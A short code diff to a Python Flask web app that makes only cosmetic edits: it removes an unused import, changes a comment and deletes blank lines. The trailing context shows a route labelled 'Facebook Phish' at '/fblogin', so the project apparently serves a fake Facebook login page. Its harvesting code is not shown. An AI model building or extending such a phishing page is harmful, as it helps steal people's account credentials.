@@ -1,18 +1,14 @@
 
 # import the Flask class from the flask module
 from flask import Flask, render_template, request, redirect
-import os
 
-
-# create the application object
+# create the application objects
 app = Flask(__name__)
 
 # use decorators to link the function to a url
-
 @app.route('/')
 def home():
     return render_template('index.html')
-
 
 # Facebook Phish
 @app.route("/fblogin", methods=["GET", "POST"])
